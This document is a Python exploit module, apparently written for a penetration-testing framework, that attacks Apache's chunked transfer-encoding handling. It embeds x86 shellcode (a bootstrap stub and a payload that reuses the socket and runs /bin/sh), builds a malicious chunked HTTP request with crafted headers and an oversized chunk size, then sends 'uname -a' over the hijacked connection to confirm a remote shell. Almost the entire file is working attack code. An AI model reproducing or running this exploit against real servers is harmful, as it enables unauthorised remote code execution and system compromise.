import time

import interfaces.exploit as exploit
from interfaces.exploit import Exploit, ExploitError
from interfaces.hasparameters import StringParam
import managers.http as HTTP

desc =	''' 
<br>
<hr><center><big><b>
Apache-Chunk
</b></big></center><hr>
<br>
<b>Vulnerability:</b><hr>		

<br><br>

<br><br>
<b>References</b><hr>

<br>
<b>Attack Details</b><hr>

<br><br>
Parameters:<br>
<br><br><br>
'''

bootstrap = \
"\xba\xbe\xba\xfe\xca\x6a\x04\xeb\x1f\x31\xc0\xb0" + \
"\x03\x50\x50\xb0\x04\xcd\x80\x31\xc9\xb1\xec\x51\x89\xe3\x80\xeb" + \
"\xf8\x53\x31\xc0\xb0\x03\x50\x50\xcd\x80\xff\xe3\xe8\xdc\xff\xff" + \
"\xff\x47\x47\x47\x47"

payload = \
"\x0d\x68\x47\x47\x47\x47\x89\xe3\x31\xc0\x50\x50\x50\x50\xc6\x04\x24" + \
"\x04\x53\x50\x50\x31\xd2\x31\xc9\xb1\x80\xc1\xe1\x18\xd1\xea\x31" + \
"\xc0\xb0\x85\xcd\x80\x72\x02\x09\xca\xff\x44\x24\x04\x80\x7c\x24" + \
"\x04\x20\x75\xe9\x31\xc0\x89\x44\x24\x04\xc6\x44\x24\x04\x20\x89" + \
"\x64\x24\x08\x89\x44\x24\x0c\x89\x44\x24\x10\x89\x44\x24\x14\x89" + \
"\x54\x24\x18\x8b\x54\x24\x18\x89\x14\x24\x31\xc0\xb0\x5d\xcd\x80" + \
"\x31\xc9\xd1\x2c\x24\x73\x27\x31\xc0\x50\x50\x50\x50\xff\x04\x24" + \
"\x54\xff\x04\x24\xff\x04\x24\xff\x04\x24\xff\x04\x24\x51\x50\xb0" + \
"\x1d\xcd\x80\x58\x58\x58\x58\x58\x3c\x4f\x74\x0b\x58\x58\x41\x80" + \
"\xf9\x20\x75\xce\xeb\xbd\x90\x31\xc0\x50\x51\x50\x31\xc0\xb0\x5a" + \
"\xcd\x80\xff\x44\x24\x08\x80\x7c\x24\x08\x03\x75\xef\x31\xc0\x50" + \
"\xc6\x04\x24\x0b\x80\x34\x24\x01\x68\x42\x4c\x45\x2a\x68\x2a\x47" + \
"\x4f\x42\x89\xe3\xb0\x09\x50\x53\xb0\x01\x50\x50\xb0\x04\xcd\x80" + \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50" + \
"\x53\x89\xe1\x50\x51\x53\x50\xb0\x3b\xcd\x80\xcc"

class ApacheChunk(Exploit):

	def __init__(self):
		Exploit.__init__(self,'Apache-Chunk', desc)
		self.res	= None 
		self.add_param(StringParam('CMD','uname -a', 'The command to be executed during the attack'))
		self.add_param(StringParam('RESULT','OpenBSD','The string that must be present in the result if the attack is successful'))

	def execute(self):
		self.res = None
		
		bs = bootstrap

		http = HTTP.HttpManager()

		self.log.info("Ready to send the malicious request...")
		
		cmd = "GET / HTTP/1.1"
		
		h = {
		 'host' : 'apache-nosejob.c',
		 'X-CCCCCCC' : '%s%s'%("\x42" * (84 - len(bs)), bs),
		 'X-AAAA' : '%s%s'%("\xc0\xf0\x0f\x00" * 8, "\x00" * 36),
		 'X-AAAA' : 'FFFFFFFFFFFFFFFF%s'%("\x00" * 36),
		 'Transfer-Encoding' : 'chunked'
		 }
		
		c1 = HTTP.Chunk("BBBBBBB")
		c2 = HTTP.Chunk(payload ,size="ffffff6a") # 6e ?
		data = HTTP.ChunkList()
		data.add(c1)
		data.add(c2)
		
		req = HTTP.HttpRequest(cmd, header= h, data=data)
		
		#print str(req)
		
		if(http.send_request(req) == False):
			self.log.error("Request failed")
			raise ExploitError("Connection or request failed")
		
		
		time.sleep(3)
		#print " --> [%s]"%http.sock.readline('\r',blocking=True, timeout=3)
		print " --> [%s]"%http.sock.read(2024)
		print " --> [%s]"%http.sock.read(2024)
		
		self.log.info("Sending the command... cross your finger")

		http.send_raw("uname -a\n\n")
		
		self.log.info("Reading the response")
		
		self.res = http.get_raw_response()
		
		self.log.debug("RESULT: \r\n%s"%self.res)
	
		http.close()	
		
	def isSuccessful(self):
		if self.RESULT in str(self.res):
			return exploit.RES_OK
		else:
			return exploit.RES_FAIL
		



